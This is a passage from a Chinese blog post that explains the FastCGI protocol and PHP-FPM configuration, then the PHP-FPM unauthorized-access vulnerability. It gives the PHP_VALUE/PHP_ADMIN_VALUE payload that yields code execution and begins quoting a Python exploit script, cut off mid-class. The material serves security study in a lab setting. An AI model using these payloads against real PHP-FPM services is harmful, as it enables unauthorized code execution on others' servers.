FCGI_Record;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>头由8个uchar类型的变量组成，每个变量1字节。其中，<code>requestId</code>占两个字节，一个唯一的标志id，以避免多个请求之间的影响；<code>contentLength</code>占两个字节，表示body的大小。</p><p>语言端解析了fastcgi头以后，拿到<code>contentLength</code>，然后再在TCP流里读取大小等于<code>contentLength</code>的数据，这就是body体。</p><p>Body后面还有一段额外的数据（Padding），其长度由头中的paddingLength指定，起保留作用。不需要该Padding的时候，将其长度设置为0即可。</p><p>可见，一个fastcgi record结构最大支持的body大小是<code>2^16</code>，也就是65536字节。</p></blockquote><p><strong>type</strong></p><blockquote><p>type就是指定该record的作用。因为FastCGI一个record的大小是有限的，作用也是单一的，所以我们需要在一个TCP流里传输多个record。通过type来标志每个record的作用，用requestId作为同一次请求的id。</p><p>也就是说，每次请求，会有多个record，他们的requestId是相同的。</p></blockquote><p>主要的几种type类型如下图：</p><p><img src="/2019/08/25/浅谈PHP-FPM安全/9.png" alt=""></p><p>服务器中间件和PHP-FPM通信的第一个数据包是type为1的record，而后续通信的type为4、5、6、7的record，结束时发送type为2、3的record。</p><p>这里我们重点关注type为4的record，因为后面的漏洞利用涉及到这块。</p><blockquote><p>当后端语言接收到一个<code>type</code>为4的record后，就会把这个record的body按照对应的结构解析成key-value对，这就是环境变量。环境变量的结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&gt; typedef struct &#123;</span><br><span class="line">&gt;   unsigned char nameLengthB0;  /* nameLengthB0  &gt;&gt; 7 == 0 */</span><br><span class="line">&gt;   unsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */</span><br><span class="line">&gt;   unsigned char nameData[nameLength];</span><br><span class="line">&gt;   unsigned char valueData[valueLength];</span><br><span class="line">&gt; &#125; FCGI_NameValuePair11;</span><br><span class="line">&gt; </span><br><span class="line">&gt; typedef struct &#123;</span><br><span class="line">&gt;   unsigned char nameLengthB0;  /* nameLengthB0  &gt;&gt; 7 == 0 */</span><br><span class="line">&gt;   unsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */</span><br><span class="line">&gt;   unsigned char valueLengthB2;</span><br><span class="line">&gt;   unsigned char valueLengthB1;</span><br><span class="line">&gt;   unsigned char valueLengthB0;</span><br><span class="line">&gt;   unsigned char nameData[nameLength];</span><br><span class="line">&gt;   unsigned char valueData[valueLength</span><br><span class="line">&gt;           ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">&gt; &#125; FCGI_NameValuePair14;</span><br><span class="line">&gt; </span><br><span class="line">&gt; typedef struct &#123;</span><br><span class="line">&gt;   unsigned char nameLengthB3;  /* nameLengthB3  &gt;&gt; 7 == 1 */</span><br><span class="line">&gt;   unsigned char nameLengthB2;</span><br><span class="line">&gt;   unsigned char nameLengthB1;</span><br><span class="line">&gt;   unsigned char nameLengthB0;</span><br><span class="line">&gt;   unsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */</span><br><span class="line">&gt;   unsigned char nameData[nameLength</span><br><span class="line">&gt;           ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">&gt;   unsigned char valueData[valueLength];</span><br><span class="line">&gt; &#125; FCGI_NameValuePair41;</span><br><span class="line">&gt; </span><br><span class="line">&gt; typedef struct &#123;</span><br><span class="line">&gt;   unsigned char nameLengthB3;  /* nameLengthB3  &gt;&gt; 7 == 1 */</span><br><span class="line">&gt;   unsigned char nameLengthB2;</span><br><span class="line">&gt;   unsigned char nameLengthB1;</span><br><span class="line">&gt;   unsigned char nameLengthB0;</span><br><span class="line">&gt;   unsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */</span><br><span class="line">&gt;   unsigned char valueLengthB2;</span><br><span class="line">&gt;   unsigned char valueLengthB1;</span><br><span class="line">&gt;   unsigned char valueLengthB0;</span><br><span class="line">&gt;   unsigned char nameData[nameLength</span><br><span class="line">&gt;           ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">&gt;   unsigned char valueData[valueLength</span><br><span class="line">&gt;           ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">&gt; &#125; FCGI_NameValuePair44;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>这其实是4个结构，至于用哪个结构，有如下规则：</p><ol><li>key、value均小于128字节，用<code>FCGI_NameValuePair11</code></li><li>key大于128字节，value小于128字节，用<code>FCGI_NameValuePair41</code></li><li>key小于128字节，value大于128字节，用<code>FCGI_NameValuePair14</code></li><li>key、value均大于128字节，用<code>FCGI_NameValuePair44</code></li></ol></blockquote><p>举个例子，用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>，如果web目录是<code>/var/www/html</code>，那么Nginx会将这个请求变成如下key-value对，即此时FastCGI协议包record的type为4：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &apos;GATEWAY_INTERFACE&apos;: &apos;FastCGI/1.0&apos;,</span><br><span class="line">    &apos;REQUEST_METHOD&apos;: &apos;GET&apos;,</span><br><span class="line">    &apos;SCRIPT_FILENAME&apos;: &apos;/var/www/html/index.php&apos;,</span><br><span class="line">    &apos;SCRIPT_NAME&apos;: &apos;/index.php&apos;,</span><br><span class="line">    &apos;QUERY_STRING&apos;: &apos;?a=1&amp;b=2&apos;,</span><br><span class="line">    &apos;REQUEST_URI&apos;: &apos;/index.php?a=1&amp;b=2&apos;,</span><br><span class="line">    &apos;DOCUMENT_ROOT&apos;: &apos;/var/www/html&apos;,</span><br><span class="line">    &apos;SERVER_SOFTWARE&apos;: &apos;php/fcgiclient&apos;,</span><br><span class="line">    &apos;REMOTE_ADDR&apos;: &apos;127.0.0.1&apos;,</span><br><span class="line">    &apos;REMOTE_PORT&apos;: &apos;12345&apos;,</span><br><span class="line">    &apos;SERVER_ADDR&apos;: &apos;127.0.0.1&apos;,</span><br><span class="line">    &apos;SERVER_PORT&apos;: &apos;80&apos;,</span><br><span class="line">    &apos;SERVER_NAME&apos;: &quot;localhost&quot;,</span><br><span class="line">    &apos;SERVER_PROTOCOL&apos;: &apos;HTTP/1.1&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这个数组其实就是PHP中<code>$_SERVER</code>数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充<code>$_SERVER</code>数组，也是告诉fpm：“我要执行哪个PHP文件”。</p><p>PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行<code>SCRIPT_FILENAME</code>的值指向的PHP文件，也就是<code>/var/www/html/index.php</code>。</p></blockquote><p>有个注意点，就是PHP 5.3.9之后加入了FPM增加了security.limit_extensions选项，这个选项默认只解析.php文件，具体的在下一小节说到。</p><h2 id="0x03-FPM"><a href="#0x03-FPM" class="headerlink" title="0x03 FPM"></a>0x03 FPM</h2><h3 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h3><p> 官方定义如下：</p><blockquote><p>FPM（FastCGI 进程管理器）用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。</p></blockquote><p>简单地说，FPM是实现和管理FastCGI进程的管理器，能够接收服务器中间件发送的FastCGI协议包并进行解析、最后将解析结果返回给服务器中间件。</p><p>这里借用先知的一个图来看看就清楚了：</p><p><img src="/2019/08/25/浅谈PHP-FPM安全/1.png" alt=""></p><h3 id="通信方式"><a href="#通信方式" class="headerlink" title="通信方式"></a>通信方式</h3><p>在PHP使用FastCGI连接模式的情况下，Web服务器中间件如Nginx和PHP-FPM之间的通信方式又分为两种：</p><h4 id="TCP模式"><a href="#TCP模式" class="headerlink" title="TCP模式"></a>TCP模式</h4><p>TCP模式即是PHP-FPM进程会监听本机上的一个端口（默认为9000），然后Nginx会把客户端数据通过FastCGI协议传给9000端口，PHP-FPM拿到数据后会调用CGI进程解析。</p><p>通常我们可以通过查看Nginx的配置文件default.conf来确认是否是TCP模式，这里个人环境中的路径为<code>/etc/nginx/conf.d/default.conf</code>，关注fastcgi_pass这一项，若为ip+port的形式即为TCP模式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">      index index.php index.html index.htm;</span><br><span class="line">      include /etc/nginx/fastcgi_params;</span><br><span class="line">      fastcgi_pass 127.0.0.1:9000;</span><br><span class="line">      fastcgi_index index.php;</span><br><span class="line">      include fastcgi_params;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>在PHP-FPM中，可以通过查看其配置文件，个人环境中的路径为<code>/usr/local/etc/php-fpm.d/www.conf</code>，看到listen一项若为ip+port的形式即为TCP模式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">; The address on which to accept FastCGI requests.</span><br><span class="line">; Valid syntaxes are:</span><br><span class="line">;   &apos;ip.add.re.ss:port&apos;    - to listen on a TCP socket to a specific IPv4 address on</span><br><span class="line">;                            a specific port;</span><br><span class="line">;   &apos;[ip:6:addr:ess]:port&apos; - to listen on a TCP socket to a specific IPv6 address on</span><br><span class="line">;                            a specific port;</span><br><span class="line">;   &apos;port&apos;                 - to listen on a TCP socket to all addresses</span><br><span class="line">;                            (IPv6 and IPv4-mapped) on a specific port;</span><br><span class="line">;   &apos;/path/to/unix/socket&apos; - to listen on a unix socket.</span><br><span class="line">; Note: This value is mandatory.</span><br><span class="line">listen = 127.0.0.1:9000</span><br></pre></td></tr></table></figure><h4 id="Unix-Socket模式"><a href="#Unix-Socket模式" class="headerlink" title="Unix Socket模式"></a>Unix Socket模式</h4><p>Unix套接字模式是Unix系统进程间通信（IPC）的一种被广泛采用方式，以文件（一般是.sock）作为socket的唯一标识（描述符），需要通信的两个进程引用同一个socket描述符文件就可以建立通道进行通信了。</p><p>相比之下，Unix套接字模式的性能会优于TCP模式。</p><p>还是一样的识别方法，在Nginx的default.conf中查看fastcgi_pass：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location~\.php$&#123;</span><br><span class="line">      index index.php index.html index.htm;</span><br><span class="line">      include /etc/nginx/fastcgi_params;</span><br><span class="line">      fastcgi_pass unix:/run/php/php7.3-fpm.sock;</span><br><span class="line">      fastcgi_index index.php;</span><br><span class="line">      include fastcgi_params;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在PHP-FPM的<a href="http://www.conf中查看listen：" target="_blank" rel="noopener">www.conf中查看listen：</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listen = /run/php/php7.3-fpm.sock</span><br></pre></td></tr></table></figure><h3 id="security-limit-extensions"><a href="#security-limit-extensions" class="headerlink" title="security.limit_extensions"></a>security.limit_extensions</h3><p>在PHP 5.3.9版本之后，PHP-FPM新添了security.limit_extensions选项，它是PHP-FPM配置文件中的一个选项，主要是用来限制能够解析的文件后缀名（默认值为php），可有效防御住Nginx解析漏洞。</p><p>我们可以自行查看PHP-FPM环境中security.limit_extensions的设置值，个人环境中的路径为<code>/usr/local/etc/php-fpm.d/www.conf</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; Limits the extensions of the main script FPM will allow to parse. This can</span><br><span class="line">; prevent configuration mistakes on the web server side. You should only limit</span><br><span class="line">; FPM to .php extensions to prevent malicious users to use other extensions to</span><br><span class="line">; execute php code.</span><br><span class="line">; Note: set an empty value to allow all extensions.</span><br><span class="line">; Default Value: .php</span><br><span class="line">;security.limit_extensions = .php .php3 .php4 .php5 .php7</span><br></pre></td></tr></table></figure><p>为什么会提到这个设置项呢？</p><p>这是因为在后面的漏洞利用中，正是这个PHP-FPM的设置，导致我们只能使用Web服务器本身已存在的PHP文件进行利用，具体的原理后面会说到。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>具体的环境搭建这篇文章写得很详细：<a href="https://xz.aliyun.com/t/5598#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/5598#toc-3</a></p><p>本人用的是P牛的docker环境直接搭建，非常方便，git clone下来之后直接<code>docker-compose up -d</code>即可运行：</p><p><a href="https://github.com/vulhub/vulhub/tree/master/fpm" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/fpm</a></p><h2 id="0x04-PHP-FPM未授权访问漏洞"><a href="#0x04-PHP-FPM未授权访问漏洞" class="headerlink" title="0x04 PHP-FPM未授权访问漏洞"></a>0x04 PHP-FPM未授权访问漏洞</h2><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>顾名思义，PHP-FPM未授权访问漏洞，就是PHP-FPM的服务端口绑定在全网监听而非绑定在本地127.0.0.1的端口上，从而导致攻击者可以从公网通过构造FastCGI报文来攻击PHP-FPM，进而导致任意代码执行。</p><p>我们先看下我们漏洞环境的PHP-FPM的通信模式和是否是在全网监听端口：</p><p><img src="/2019/08/25/浅谈PHP-FPM安全/8.png" alt=""></p><p>:::9000为IPv6形式的全网监听9000端口的意思，说明通信模式是TCP模式且是全网监听9000端口的。</p><p>既然PHP-FPM暴露在公网了，那我们就想着如何去攻击这个服务。</p><p>攻击手段很明显，就是伪造FastCGI协议报文发送过去给PHP-FPM服务，进而达到任意代码执行的效果。</p><p>注意的就是，除disable_function以外的大部分PHP配置，我们都可以通过FastCGI协议包来更改，具体的可参考php手册：<a href="https://www.php.net/manual/zh/ini.list.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/ini.list.php</a></p><p>那么如何实现任意代码执行呢？</p><p>FastCGI协议只可以传输配置信息及需要被执行的文件名及客户端传进来的GET、POST、Cookie等数据。看上去我们即使能传输任意协议包也不能任意代码执行，但是我们可以通过更改配置信息来执行任意代码。</p><h4 id="auto-prepend-file和auto-append-file"><a href="#auto-prepend-file和auto-append-file" class="headerlink" title="auto_prepend_file和auto_append_file"></a>auto_prepend_file和auto_append_file</h4><p>这两个选项是php.ini中年的两个可利用的选项。</p><p>auto_prepend_file选项是告诉PHP在执行目标文件之前，先包含auto_prepend_file中指定的文件，并且auto_prepend_file可以使用PHP伪协议；auto_append_file选项同理，区别在于执行目标文件之后才会包含指定文件。</p><p>此时，我们可以将auto_prepend_file的值设置为php://input伪协议，其可通过POST的方式将我们的数据传进来，那么就等于在执行任何php文件前都要包含一遍POST的内容。因此，我们只需要把待执行的代码放在Body中就可以实现任意代码执行了。</p><p>接着又一个问题，我们怎么设置auto_prepend_file的值呢？此外，php://input伪协议也是需要开启allow_url_include选项的，那又在哪里设置开启呢？</p><h4 id="PHP-VALUE和PHP-ADMIN-VALUE"><a href="#PHP-VALUE和PHP-ADMIN-VALUE" class="headerlink" title="PHP_VALUE和PHP_ADMIN_VALUE"></a>PHP_VALUE和PHP_ADMIN_VALUE</h4><p>PHP_VALUE和PHP_ADMIN_VALUE是PHP-FPM的两个环境变量。PHP_VALUE可以设置模式为PHP_INI_USER和PHP_INI_ALL的选项，PHP_ADMIN_VALUE可以设置所有选项（disable_functions除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）。</p><p>由前面分析的FastCGI协议知道，type为4的record是键值对的形式，因此我们可以直接在报文中添加这两个PHP-FPM的环境变量来进行设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &apos;GATEWAY_INTERFACE&apos;: &apos;FastCGI/1.0&apos;,</span><br><span class="line">    &apos;REQUEST_METHOD&apos;: &apos;GET&apos;,</span><br><span class="line">    &apos;SCRIPT_FILENAME&apos;: &apos;/var/www/html/index.php&apos;,</span><br><span class="line">    &apos;SCRIPT_NAME&apos;: &apos;/index.php&apos;,</span><br><span class="line">    &apos;QUERY_STRING&apos;: &apos;?a=1&amp;b=2&apos;,</span><br><span class="line">    &apos;REQUEST_URI&apos;: &apos;/index.php?a=1&amp;b=2&apos;,</span><br><span class="line">    &apos;DOCUMENT_ROOT&apos;: &apos;/var/www/html&apos;,</span><br><span class="line">    &apos;SERVER_SOFTWARE&apos;: &apos;php/fcgiclient&apos;,</span><br><span class="line">    &apos;REMOTE_ADDR&apos;: &apos;127.0.0.1&apos;,</span><br><span class="line">    &apos;REMOTE_PORT&apos;: &apos;12345&apos;,</span><br><span class="line">    &apos;SERVER_ADDR&apos;: &apos;127.0.0.1&apos;,</span><br><span class="line">    &apos;SERVER_PORT&apos;: &apos;80&apos;,</span><br><span class="line">    &apos;SERVER_NAME&apos;: &quot;localhost&quot;,</span><br><span class="line">    &apos;SERVER_PROTOCOL&apos;: &apos;HTTP/1.1&apos;</span><br><span class="line">    &apos;PHP_VALUE&apos;: &apos;auto_prepend_file = php://input&apos;,</span><br><span class="line">    &apos;PHP_ADMIN_VALUE&apos;: &apos;allow_url_include = On&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置auto_prepend_file = php://input且allow_url_include = On，然后将我们需要执行的代码放在Body中，即可执行任意代码。</p><p>另外，SCRIPT_FILENAME选项需要我们设置一个服务端已存在的PHP文件，该选项是让PHP-FPM执行目标服务器上的文件，且由于security.limit_extensions项的限制导致只能执行PHP文件。</p><p>如何找一个已存在的且通用的PHP文件来利用呢？</p><h4 id="查找PHP默认安装的php文件"><a href="#查找PHP默认安装的php文件" class="headerlink" title="查找PHP默认安装的php文件"></a>查找PHP默认安装的php文件</h4><p>我们搜索下漏洞环境中已有的PHP文件，找一下PHP安装过程中默认存在的PHP文件即可：</p><p><img src="/2019/08/25/浅谈PHP-FPM安全/5.png" alt=""></p><p> 非常多，这里我们挑一个常见的<code>/usr/local/lib/php/PEAR.php</code>。</p><h4 id="EXP脚本分析"><a href="#EXP脚本分析" class="headerlink" title="EXP脚本分析"></a>EXP脚本分析</h4><p>好了，基本的原理大概都说明了，下面看下P牛写的利用脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line"></span><br><span class="line">PY2 = <span class="keyword">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(chr(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> bytes([i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span><span class="params">(c)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(c, int):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> ord(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> issubclass(type(s), str):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        s = str(s, <span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = str(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">"""A Fast-CGI Client for Python"""</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    